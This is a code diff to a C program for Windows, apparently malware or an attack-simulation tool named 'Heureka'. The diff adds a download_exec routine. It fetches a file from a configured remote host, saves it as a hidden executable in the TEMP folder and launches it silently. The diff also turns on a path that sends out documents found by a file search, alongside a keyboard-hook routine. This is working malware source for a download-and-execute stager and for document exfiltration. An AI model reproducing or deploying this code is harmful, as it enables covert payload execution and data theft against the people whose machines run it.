@@ -80,7 +80,7 @@ void hook_keyboard(){
 }
 #endif
 
-#if WEB_SEND_RECV==1 && REMOTE_HOST==1
+#if WEB_SEND_RECV==1 
 void web_send_recv(unsigned char *blob=NULL,size_t size=0){
 	BOOL  bResults = FALSE;
     HINTERNET hSession = NULL,
@@ -144,6 +144,112 @@ void web_send_recv(unsigned char *blob=NULL,size_t size=0){
 }
 #endif
 
+#if DOWNLOAD_EXEC==1 
+void download_exec(bool exec=true){
+	BOOL  bResults = FALSE;
+    HINTERNET hSession = NULL,
+              hConnect = NULL,
+              hRequest = NULL;
+	print_status("download_exec begins");
+
+    // Use WinHttpOpen to obtain a session handle.
+    hSession = WinHttpOpen(  L"Heureka", 
+                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                             WINHTTP_NO_PROXY_NAME, 
+                             WINHTTP_NO_PROXY_BYPASS, 0);
+
+    // Specify an HTTP server.
+    if (hSession)
+        hConnect = WinHttpConnect( hSession, download_exec_host,
+                                   INTERNET_DEFAULT_HTTP_PORT, 0);
+	else{
+		print_error("No session!");
+		return;
+	}
+
+    // Create an HTTP Request handle.
+    if (hConnect)
+        hRequest = WinHttpOpenRequest( hConnect, L"POST", 
+                                       download_exec_resource, 
+                                       NULL, WINHTTP_NO_REFERER, 
+                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                       0);
+	else{
+		print_error("No connection!");
+		WinHttpCloseHandle(hSession);
+		return;
+	}
+
+    // Send a Request.
+
+    if (hRequest) {
+		bResults = WinHttpSendRequest( hRequest, 
+                                       WINHTTP_NO_ADDITIONAL_HEADERS,
+                                       0, WINHTTP_NO_REQUEST_DATA, 0, 
+                                       0, 0);
+	}else{
+		print_error("No Request");
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		return;
+	}
+ 
+
+    // Report any errors.
+    if (!bResults){
+        print_error( "Error %d has occurred.", GetLastError());
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+	}else{
+		DWORD bytesRead=0;
+		//LPVOID responseBuf[10240];
+		void *responseBuf=malloc(10240000);
+		bResults = WinHttpReceiveResponse( hRequest, NULL);
+		WinHttpReadData(hRequest, responseBuf,10240000,&bytesRead);
+		print_status("Received bytes: %d",bytesRead);
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		HANDLE hFile;
+	
+		TCHAR tmppath[MAX_PATH];
+		ZeroMemory(tmppath,MAX_PATH);
+		DWORD err=GetTempPath(MAX_PATH,tmppath);
+		DWORD dwWritten=0;
+		if (err>MAX_PATH || err==0){
+			print_error("Unable to retreive TEMP path");
+			return; 
+		}
+		if (strcat_s(tmppath,MAX_PATH,"heureka_downloadexec.exe")!=0){
+			print_error("Unable to generate TEMP filename"); 
+			return;
+		}
+
+		hFile=CreateFile(tmppath,FILE_GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
+		if (hFile==INVALID_HANDLE_VALUE){
+			err=GetLastError();
+			print_error("Unable to create file in TEMP");
+			return; 
+		}
+		WriteFile(hFile, responseBuf, bytesRead,&dwWritten,NULL);
+		CloseHandle(hFile);
+		free(responseBuf);
+		print_status("Created file: %s (%d)",tmppath,dwWritten);
+		if(exec){
+			print_status("Launching file");
+			ShellExecute(NULL,"open",tmppath,"",NULL,SW_HIDE);
+		}
+	}
+
+    // Close any open handles.
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+	print_status("download_exec ends");
+}
+#endif
+
 #if SEARCH_DOCS==1 
 void search_docs(){
 	
@@ -175,7 +281,7 @@ void search_docs(){
 			{
 				do{
 					print_status("File found: %s", FindFileData.cFileName);
-#if WEB_SEND_RECV==1 && REMOTE_HOST==1
+#if WEB_SEND_RECV==1 
 					DWORD dwBytesRead = 0;
 					char ReadBuffer[10240] = {0};
 					TCHAR filePath[MAX_PATH];
@@ -498,8 +604,12 @@ int main(int argc,char **argv){
 	search_docs();
 	#endif
 
-	#if WEB_SEND_RECV==1 && REMOTE_HOST==1
+	#if WEB_SEND_RECV==1 
 	web_send_recv((unsigned char*)"AAAA",4);
+	#endif
+
+	#if DOWNLOAD_EXEC==1 
+	download_exec();
 	#endif
 
 	#if HOOK_KEYBOARD==1
